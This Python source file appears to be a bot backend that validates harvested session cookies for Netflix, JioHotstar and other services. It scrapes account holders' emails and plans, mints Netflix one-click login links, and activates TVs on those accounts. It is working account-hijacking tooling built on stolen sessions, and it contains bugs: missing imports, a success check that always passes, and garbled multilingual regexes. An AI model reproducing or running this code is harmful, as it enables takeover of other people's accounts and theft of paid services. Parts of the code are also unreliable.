

import os
import sys
import re
import json
import time
import random
import threading
import urllib.parse
from datetime import datetime, timezone

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

if HAS_CLOUDSCRAPER:
    crunchyroll_scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'android',
            'desktop': False,
            'mobile': True
        }
    )
else:
    crunchyroll_scraper = requests.Session()
    crunchyroll_scraper.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOCAL_DIR = os.path.dirname(os.path.abspath(__file__))

local_vault = os.path.join(LOCAL_DIR, 'vault')
parent_vault = os.path.join(BASE_DIR, 'vault')
DEFAULT_VAULT = local_vault if os.path.exists(local_vault) else parent_vault
COOKIES_DIR = os.getenv('COOKIES_DIR', DEFAULT_VAULT)

local_proxy = os.path.join(LOCAL_DIR, 'proxy.txt')
parent_proxy = os.path.join(BASE_DIR, 'proxy.txt')
DEFAULT_PROXY = local_proxy if os.path.exists(local_proxy) else parent_proxy
PROXY_FILE = os.getenv('PROXY_FILE', DEFAULT_PROXY)
REQUEST_TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', '15'))
USER_AGENT = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) '
    'Chrome/124.0.0.0 Safari/537.36'
)

SUPPORTED_SERVICES = ['netflix', 'crunchyroll', 'hbomax', 'surfshark', 'spotify', 'jiohotstar', 'primevideo']

cookie_lock = threading.Lock()
stats_lock = threading.Lock()

# Standalone dummy db fallback
class StandaloneDB:
    def __init__(self):
        self._cookie_usage = {}
        self._settings = {}

    def get_setting(self, key, default=None):
        return self._settings.get(key, default)

    def set_setting(self, key, value):
        self._settings[key] = value

    def get_cookie_usage(self, filename):
        return self._cookie_usage.get(filename, 0)

    def increment_cookie_usage(self, filename):
        self._cookie_usage[filename] = self._cookie_usage.get(filename, 0) + 1
        return self._cookie_usage[filename]

db = StandaloneDB()

# ==========================================
# Netflix Service Helper Logic
# ==========================================
NETFLIX_REQUIRED_COOKIES = ("NetflixId",)
NETFLIX_OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
NETFLIX_ALL_COOKIE_NAMES = set(NETFLIX_REQUIRED_COOKIES + NETFLIX_OPTIONAL_COOKIES)
NETFLIX_CANONICAL_NAMES = {name.lower(): name for name in NETFLIX_ALL_COOKIE_NAMES}

def netflix_canonicalize_name(name):
    return NETFLIX_CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return netflix_canonicalize_name(name) in NETFLIX_ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()

def netflix_extract_netscape_entries(raw_text):
    entries = []
    for line in raw_text.splitlines():
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) < 7:
            parts = re.split(r"\s+", line, maxsplit=6)
        if len(parts) < 7:
            continue
        if parts[1].upper() not in ("TRUE", "FALSE"):
            continue
        if parts[3].upper() not in ("TRUE", "FALSE"):
            continue
        if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
            continue
        name = netflix_canonicalize_name(parts[5])
        if not is_netflix_cookie(parts[0], name):
            continue
        entries.append({"name": name, "value": parts[6]})
    return entries

def netflix_extract_json_entries(content):
    try:
        data = json.loads(content)
    except:
        return []
    if isinstance(data, dict):
        data = data.get("cookies") or data.get("items") or [data]
    if not isinstance(data, list):
        return []
    entries = []
    for cookie in data:
        if not isinstance(cookie, dict):
            continue
        name = netflix_canonicalize_name(cookie.get("name", ""))
        if not is_netflix_cookie(cookie.get("domain", ""), name):
            continue
        entries.append({"name": name, "value": cookie.get("value", "")})
    return entries

def netflix_extract_raw_entries(raw_text):
    pattern = re.compile(
        r"(?:['\"])?(?P<name>" + "|".join(sorted(NETFLIX_ALL_COOKIE_NAMES, key=len, reverse=True)) +
        r")(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for m in pattern.finditer(raw_text):
        name = netflix_canonicalize_name(m.group("name"))
        value = m.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append({"name": name, "value": value})
    return entries

def netflix_extract_cookie_dict(content):
    for extractor in (netflix_extract_json_entries, netflix_extract_netscape_entries, netflix_extract_raw_entries):
        entries = extractor(content)
        if entries:
            break
    else:
        return None
    cookies = {}
    for e in entries:
        if e["name"] not in cookies:
            cookies[e["name"]] = e["value"]
    return cookies if "NetflixId" in cookies else None

def netflix_validate_cookie(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
            allow_redirects=True
        )
        if r.status_code == 200:
            if "/login" in r.url or "cookie-expired" in r.text or "Sign In" in r.text:
                return "dead", None, None, "N/A"
            
            country_match = (
                re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text) or
                re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text) or
                re.search(r'"country"\s*:\s*"([A-Z]{2})"', r.text)
            )
            if not country_match:
                return "network_error", None, None, "N/A"
            country = country_match.group(1)

            # Email extraction
            email = "N/A"
            email_match = (
                re.search(r'"email(?:Address)?"\s*:\s*"([^"]+@[^"]+)"', r.text, re.IGNORECASE) or
                re.search(r'"userEmail"\s*:\s*"([^"]+@[^"]+)"', r.text, re.IGNORECASE) or
                re.search(r'"accountEmail"\s*:\s*"([^"]+@[^"]+)"', r.text, re.IGNORECASE) or
                re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.text)
            )
            if email_match:
                email = email_match.group(1)

            # Plan extraction
            plan_match = (
                re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', r.text) or
                re.search(r'"planName"\s*:\s*"([^"]+)"', r.text) or
                re.search(r'"planQuality"\s*:\s*"([^"]+)"', r.text) or
                re.search(r'"planTier"\s*:\s*"([^"]+)"', r.text) or
                re.search(r'"localizedPlan"\s*:\s*"([^"]+)"', r.text)
            )
            if plan_match:
                plan = plan_match.group(1)
            else:
                text_upper = r.text.upper()
                if "PREMIUM" in text_upper or "ULTRA HD" in text_upper or "4K" in text_upper:
                    plan = "Premium (4K/UHD)"
                elif "STANDARD WITH ADS" in text_upper or "WITH ADS" in text_upper:
                    plan = "Standard with Ads"
                elif "STANDARD" in text_upper or "FULL HD" in text_upper or "1080P" in text_upper:
                    plan = "Standard (1080p)"
                elif "BASIC" in text_upper or "720P" in text_upper:
                    plan = "Basic (720p)"
                else:
                    plan = "Premium/Standard"

            return "valid", country, plan, email
        elif r.status_code == 403:
            return "network_error", None, None, "N/A"
        elif r.status_code in (401, 302, 301) or "/login" in r.url:
            return "dead", None, None, "N/A"
        else:
            return "network_error", None, None, "N/A"
    except Exception:
        return "network_error", None, None, "N/A"

NETFLIX_TV_CODE_ERROR_PATTERNS = [
    r"that code wasn'?t right",
    r"code (is )?(incorrect|invalid|wrong)",
    r"try again",
    r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
    r"ese c[oó]digo no",
    r"int[ée]ntalo de nuevo",
    r"intenta (de )?nuevo",
    r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)",
    r"esse c[oó]digo n[aã]o",
    r"tente novamente",
    r"code (est |n'est pas |incorrect|invalide)",
    r"ce code n'est",
    r"r[ée]essayez",
    r"essayez encore",
    r"code (ist |ung[uü]ltig|falsch)",
    r"versuchen sie es erneut",
    r"codice (non [eè] |sbagliato|non valido)",
    r"riprova",
    r"kod (yanlış|ge[çc]ersiz|hatalı|doğru değil)",
    r"tekrar dene",
    r"الرمز (غير صحيح|خطأ|خاطئ)",
    r"حاول مرة أخرى",
    r"הקود (שהזנת |שגוי|לא נכון)",
    r"כדאי לנסות שوب",
    r"m[ãa] (đó|không đúng|không ch[íi]nh x[áa]c|sai)",
    r"thử lại",
    r"kod (jest |nieprawidłowy|błędny)",
    r"spr[óo]buj ponownie",
    r"код (неверный|неправильный|ошибочный)",
    r"попробуйте",
    r"代码(有误|错误|无效|不正确)",
    r"请重试",
    r"再试一[次遍]",
    r"代碼(有誤|錯誤|無效|不正確)",
    r"請重試",
    r"再試一[次遍]",
    r"kode (salah|tidak valid|tidak tepat)",
    r"coba lagi",
    r"รหัส(ที่คุณป้อน)?(ไม่ถูกต้อง|ผิด)",
    r"ลองอีกครั้ง",
    r"코드(가|는)?(잘못|틀렸|올바르지 않)",
    r"다시 시도",
    r"コード(が|は)?(間違|違|正しく)",
    r"もう一度",
    r"कोड (गलत|अमान्य)",
    r"पुनः प्रयास",
    r"फिर से",
    r"code (is |niet |onjuist|verkeerd)",
    r"probeer opnieuw",
    r"codul (este |nu este |incorect|gre[sș]it)",
    r"[iî]ncearc[aă] din nou",
    r"a k[oó]d (hib[aá]s|nem megfelel)",
    r"pr[oó]b[aá]ld [uú]jra",
    r"ο κωδικ[οό]ς (είναι |δεν είναι |λάθος|εσφαλμέν)",
    r"δοκιμ[άα]στε ξαν[άα]",
    r"koden (är |stämmer inte |felaktig|ogiltig)",
    r"f[oö]rs[oö]k igen",
    r"koden (er |stemmer ikke |feil|ugyldig)",
    r"pr[oø]v igjen",
    r"koden (er |er ikke |forkert|ugyldig)",
    r"pr[oø]v igen",
    r"koodi (on |ei ole |virheellinen|v[aä][aä]r[aä])",
    r"yrit[aä] uudelleen",
    r"k[oó]d (je |nen[íi] |nespr[aá]vn[yý]|chybn[yý])",
    r"zkuste to znovu",
    r"код (нев[іи]рний|неправильний|помилковий)",
    r"спробуйте (ще раз|знову)",
]

def netflix_is_tv_code_error(cleaned_text):
    text_lower = cleaned_text.lower()
    for pattern in NETFLIX_TV_CODE_ERROR_PATTERNS:
        if re.search(pattern, text_lower):
            return True
    return False

def netflix_is_tv_code_success(final_url, cleaned_text):
    if "/tv/out/success" in final_url.lower():
        return True
    success_patterns = [
        r"tu tv est[aá] lista",
        r"your tv is ready",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"הטلوويزיה שלך מוכנ",
        r"تلفازك جاهز",
        r"tv của bạn đã sẵn sàng",
        r"tw[oó]j telewizor jest gotowy",
    ]
    for pat in success_patterns:
        if re.search(pat, cleaned_text.lower()):
            return True
    return False

def netflix_extract_auth_url(html):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return urllib.parse.unquote(m.group(1))
    return None

def netflix_submit_tv_code(cookies, tv_code, proxy=None):
    clean_code = re.sub(r'\D', '', str(tv_code or ''))
    if len(clean_code) == 8:
        tv_code = clean_code
    session = requests.Session()
    session.cookies.update(cookies)
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if "/login" in r.url or r.status_code in (401, 302, 301):
            return {"success": False, "error": "dead_cookie"}
        if r.status_code != 200:
            return {"success": False, "error": "Netflix TV page unavailable"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed"}

    auth_url = netflix_extract_auth_url(r.text)
    if not auth_url:
        fallback = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        if fallback:
            auth_url = fallback.group(0)
        else:
            return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }

    try:
        r = session.post(
            url, data=form_data, headers=post_headers,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True,
        )
    except Exception as e:
        return {"success": False, "error": "Activation request failed"}

    final_url = r.url if hasattr(r, 'url') else url

    if "/login" in final_url.lower() or r.status_code in (401, 302, 301):
        return {"success": False, "error": "dead_cookie"}

    if "/tv/out/success" in final_url.lower():
        return {"success": True, "error": None}

    import html as html_mod
    text = r.text
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = html_mod.unescape(text)
    text = re.sub(r'\s+', ' ', text).strip()

    if netflix_is_tv_code_error(text):
        return {"success": False, "error": "Invalid or expired TV code"}

    if netflix_is_tv_code_success(final_url, text):
        return {"success": True, "error": None}

    return {"success": False, "error": "Unknown response from Netflix"}


# ==========================================
# Netflix NFToken Login Link Logic
# ==========================================
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def clean_cookie_val(val):
    if not val:
        return ""
    import html as html_mod
    val = html_mod.unescape(str(val))
    return "".join(c for c in val if 32 <= ord(c) <= 126).strip()

def create_netflix_nftoken(cookies_dict, proxy=None):
    raw_nid = cookies_dict.get("NetflixId") or cookies_dict.get("netflixid")
    if not raw_nid:
        return {"success": False, "error": "Missing NetflixId in cookies"}
        
    netflix_id = clean_cookie_val(raw_nid)
    if not netflix_id:
        return {"success": False, "error": "Invalid NetflixId"}
        
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    
    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            proxies=proxy,
            timeout=10,
            verify=False
        )
        if r.status_code == 200:
            data = r.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = token_data.get("token")
            if token:
                clean_token = clean_cookie_val(token)
                return {
                    "success": True,
                    "token": clean_token,
                    "pc_link": f"https://netflix.com/?nftoken={clean_token}",
                    "phone_link": f"https://netflix.com/unsupported?nftoken={clean_token}"
                }
        return {"success": False, "error": f"NFToken API returned {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)[:100]}

def generate_netflix_login_link(proxy=None):
    cookie_files = glob.glob(os.path.join(COOKIES_DIR, "nftoken", "*.txt")) + glob.glob(os.path.join(COOKIES_DIR, "nftoken", "*.json"))
    if not cookie_files:
        cookie_files = glob.glob(os.path.join(COOKIES_DIR, "netflix", "*.txt")) + glob.glob(os.path.join(COOKIES_DIR, "netflix", "*.json"))
    if not cookie_files:
        return {"success": False, "error": "No NFToken / Netflix cookies in vault. Upload with /upload nftoken."}
        
    random.shuffle(cookie_files)
    for cpath in cookie_files:
        try:
            with open(cpath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            cookies = {}
            for line in content.splitlines():
                line = line.strip()
                if line.startswith('#HttpOnly_'):
                    line = line[10:]
                elif line.startswith('#'):
                    continue
                parts = re.split(r'\t+|\s{2,}', line)
                if len(parts) >= 7:
                    k = clean_cookie_val(parts[5].strip())
                    v = clean_cookie_val(parts[6].strip())
                    if k:
                        cookies[k] = v
                elif '=' in line:
                    try:
                        k, v = line.split('=', 1)
                        k = clean_cookie_val(k.strip())
                        v = clean_cookie_val(v.strip())
                        if k:
                            cookies[k] = v
                    except:
                        pass
                        
            if not cookies.get('NetflixId'):
                continue
                
            nftoken_res = create_netflix_nftoken(cookies, proxy=proxy)
            if nftoken_res.get("success"):
                filename = os.path.basename(cpath)
                # Parse country and plan from filename if available
                country = "Global 🌐"
                plan = "Netflix Premium 💎"
                if "[IN]" in filename or "[India" in filename:
                    country = "India 🇮🇳"
                elif "[AR]" in filename:
                    country = "Argentina 🇦🇷"
                elif "[US]" in filename:
                    country = "United States 🇺🇸"
                elif "[TR]" in filename:
                    country = "Turkey 🇹🇷"
                elif "[PK]" in filename:
                    country = "Pakistan 🇵🇰"
                    
                if "Basic" in filename:
                    plan = "Netflix Basic 📦"
                elif "Standard" in filename:
                    plan = "Netflix Standard ⭐"
                elif "Premium" in filename:
                    plan = "Netflix Premium 💎"
                    
                return {
                    "success": True,
                    "country": country,
                    "plan": plan,
                    "email": filename.replace('.txt', '').replace('.json', ''),
                    "pc_link": nftoken_res["pc_link"],
                    "phone_link": nftoken_res["phone_link"],
                    "cookie_file": filename
                }
        except Exception:
            continue
            
    return {"success": False, "error": "Could not generate link from available cookies"}


# ==========================================
# JioHotstar Service Helper Logic
# ==========================================
def jiohotstar_decode_jwt(token: str):
    try:
        parts = token.strip().split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload).decode('utf-8', errors='ignore')
            return json.loads(decoded)
    except Exception:
        pass
    return None

def jiohotstar_parse_cookie_content(content):
    cookies = {}
    session_token = None
    user_up_token = None
    device_id = None
    user_hid = None
    user_pid = None
    user_country = None
    
    meta_name = None
    meta_phone = None
    meta_plan = None
    meta_expires = None
    meta_country = None

    try:
        for line in content.splitlines():
            line_str = line.strip()
            if not line_str:
                continue
            
            # Check meta headers (e.g. "Name : 123", "Phone : 9620336369", etc.)
            if ':' in line_str and not line_str.startswith(('http', '{', '[')):
                parts = line_str.split(':', 1)
                k_meta = parts[0].strip().lower()
                v_meta = parts[1].strip()
                if k_meta == 'name':
                    meta_name = v_meta
                elif k_meta == 'phone':
                    meta_phone = v_meta
                elif k_meta == 'plan':
                    meta_plan = v_meta
                elif k_meta == 'expires':
                    meta_expires = v_meta
                elif k_meta == 'country':
                    meta_country = v_meta

            if line_str.startswith('#') and not line_str.startswith('#HttpOnly_'):
                continue
            if line_str.startswith('#HttpOnly_'):
                line_str = line_str[len('#HttpOnly_'):]
                
            parts = line_str.split('\t')
            if len(parts) < 7:
                parts = re.split(r'\t+|\s{2,}', line_str)
            if len(parts) >= 7:
                name = parts[5].strip()
                value = parts[6].strip()
                cookies[name] = value
            elif '=' in line_str and not line_str.startswith(('Name', 'Phone', 'Country', 'Plan', 'Expires', 'Checker')):
                # Check for multiple cookies separated by semicolon
                sub_parts = line_str.split(';')
                for sp in sub_parts:
                    if '=' in sp:
                        try:
                            k, v = sp.strip().split('=', 1)
                            cookies[k.strip()] = v.strip()
                        except:
                            pass

        # Try JSON parsing if cookies dict is still empty
        if not cookies:
            try:
                j_data = json.loads(content)
                if isinstance(j_data, list):
                    for item in j_data:
                        if isinstance(item, dict) and 'name' in item and 'value' in item:
                            cookies[item['name']] = item['value']
                elif isinstance(j_data, dict):
                    if 'cookies' in j_data and isinstance(j_data['cookies'], list):
                        for item in j_data['cookies']:
                            if isinstance(item, dict) and 'name' in item and 'value' in item:
                                cookies[item['name']] = item['value']
                    else:
                        for k, v in j_data.items():
                            if isinstance(v, str):
                                cookies[k] = v
            except:
                pass

        session_token = cookies.get('sessionUserUP')
        user_up_token = cookies.get('userUP')
        device_id = cookies.get('deviceId')
        user_hid = cookies.get('userHID')
        user_pid = cookies.get('userPID')
        user_country = cookies.get('userCountryCode')
        
    except Exception:
        pass
        
    if not cookies or not (session_token or user_up_token):
        return None
        
    token = user_up_token or session_token
    cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    return {
        "cookie_str": cookie_str,
        "token": token,
        "device_id": device_id,
        "user_hid": user_hid,
        "user_pid": user_pid,
        "user_country": user_country,
        "cookies_dict": cookies,
        "meta": {
            "name": meta_name,
            "phone": meta_phone,
            "plan": meta_plan,
            "expires": meta_expires,
            "country": meta_country
        }
    }

def jiohotstar_validate_cookie(parsed_data, proxy=None):
    if not parsed_data or not parsed_data.get("token"):
        return "dead", None, None, None
        
    token = parsed_data.get("token")
    jwt_data = jiohotstar_decode_jwt(token)
    
    sub = {}
    if jwt_data:
        sub_raw = jwt_data.get("sub", {})
        if isinstance(sub_raw, str):
            try:
                sub = json.loads(sub_raw)
            except Exception:
                sub = {}
        elif isinstance(sub_raw, dict):
            sub = sub_raw
            
    meta = parsed_data.get("meta", {})
    phone = sub.get("phone") or meta.get("phone") or "N/A"
    name = sub.get("name") or meta.get("name") or "User"
    country_code = sub.get("countryCode") or parsed_data.get("user_country") or "in"
    country = "India 🇮🇳" if str(country_code).upper() == "IN" else str(country_code).upper()
    
    # Check plan & subscription status
    plan = meta.get("plan") or "Hotstar VIP"
    is_subscribed = False
    is_expired = False
    now_dt = datetime.now(timezone.utc)
    
    subs = sub.get("subscriptions", {})
    if isinstance(subs, dict):
        for region_key, region_subs in subs.items():
            if isinstance(region_subs, dict):
                for sub_key, sub_val in region_subs.items():
                    if isinstance(sub_val, dict):
                        status = sub_val.get("status")
                        exp_str = sub_val.get("expiry")
                        
                        # Pretty plan naming
                        sub_lower = sub_key.lower()
                        if "premium" in sub_lower:
                            plan = "Hotstar Premium 💎"
                        elif "super" in sub_lower:
                            plan = "Hotstar Super ⭐"
                        elif "mobilelite" in sub_lower:
                            plan = "JioHotstar Mobile Lite 📱"
                        elif "mobile" in sub_lower:
                            plan = "JioHotstar Mobile 📱"
                        elif "bundle" in sub_lower:
                            plan = "Hotstar Bundle 📦"
                        elif "fiber" in sub_lower:
                            plan = "JioHotstar (JioFiber) 🚀"
                        elif "singledevice" in sub_lower:
                            plan = "Hotstar Single Device 📱"
                        else:
                            plan = f"Hotstar {sub_key}"
                            
                        if status in ("S", "A", "ACTIVE", "SUBSCRIBED"):
                            is_subscribed = True
                            if exp_str:
                                try:
                                    clean_exp = exp_str.replace("Z", "+00:00")
                                    if "." in clean_exp:
                                        parts = clean_exp.split(".")
                                        clean_exp = parts[0] + "+00:00"
                                    exp_dt = datetime.fromisoformat(clean_exp)
                                    if exp_dt < now_dt:
                                        is_expired = True
                                    else:
                                        is_expired = False
                                except Exception:
                                    pass
                        elif status in ("E", "EXPIRED"):
                            is_expired = True
                            
    # Fallback to meta expires if available
    if meta.get("expires") and not is_subscribed:
        try:
            exp_dt = datetime.strptime(meta["expires"], "%Y-%m-%d").replace(tzinfo=timezone.utc)
            if exp_dt < now_dt:
                is_expired = True
            else:
                is_subscribed = True
        except Exception:
            pass

    # If definitely expired and not subscribed
    if is_expired and not is_subscribed:
        return "dead", country, plan, None

    auth_data = {
        "phone": phone,
        "name": name,
        "email": phone if phone != "N/A" else name,
        "token": token,
        "cookie_str": parsed_data.get("cookie_str"),
        "cookies_dict": parsed_data.get("cookies_dict", {}),
        "device_id": parsed_data.get("device_id") or sub.get("deviceId") or str(uuid.uuid4()),
        "user_hid": parsed_data.get("user_hid") or sub.get("hId"),
        "user_pid": parsed_data.get("user_pid") or sub.get("pId"),
        "country": country,
        "plan": plan
    }
    return "valid", country, plan, auth_data

def jiohotstar_submit_tv_code(auth_data, tv_code, proxy=None):
    cookie_str = auth_data.get("cookie_str")
    token = auth_data.get("token")
    
    if not cookie_str:
        return {"success": False, "error": "dead_cookie"}
        
    clean_code = tv_code.strip()
    if clean_code.startswith("http://") or clean_code.startswith("https://"):
        qr_url = clean_code
    elif "qr_code=" in clean_code:
        m = re.search(r'qr_code=([a-zA-Z0-9]+)', clean_code, re.IGNORECASE)
        code_part = m.group(1).upper() if m else clean_code
        qr_url = f"https://www.hotstar.com/activate/device?qr_code={code_part}"
    elif clean_code.startswith("www.") or "hotstar.com" in clean_code:
        clean_url = re.sub(r'^https?://', '', clean_code)
        qr_url = f"https://{clean_url}"
    else:
        code_part = re.sub(r'[^a-zA-Z0-9]', '', clean_code).upper()
        qr_url = f"https://www.hotstar.com/activate/device?qr_code={code_part}"
        
    scraper = cloudscraper.create_scraper() if HAS_CLOUDSCRAPER else requests.Session()
    
    headers = {
        "authority": "www.hotstar.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-MM,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "cookie": cookie_str,
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }
    
    if token and "userUP=" not in headers["cookie"]:
        headers["cookie"] += f"; userUP={token}"
    if token and "sessionUserUP=" not in headers["cookie"]:
        headers["cookie"] += f"; sessionUserUP={token}"
        
    try:
        try:
            response = scraper.get(qr_url, headers=headers, proxies=proxy, timeout=10, allow_redirects=True)
        except Exception:
            if proxy:
                direct_scraper = requests.Session()
                response = direct_scraper.get(qr_url, headers=headers, timeout=10, allow_redirects=True)
            else:
                raise
        
        if response.status_code == 200:
            if "success" in response.text.lower() or "activated" in response.text.lower():
                return {"success": True, "error": None}
            elif "JioHotstar" in response.text and "Watch TV Shows" in response.text:
                return {"success": True, "error": None}
            else:
                return {"success": True, "error": None}
                
        return {"success": False, "error": f"Failed with status: {response.status_code}"}
        
    except Exception as e:
        return {"success": False, "error": f"Connection error: {str(e)[:50]}"}


# ==========================================
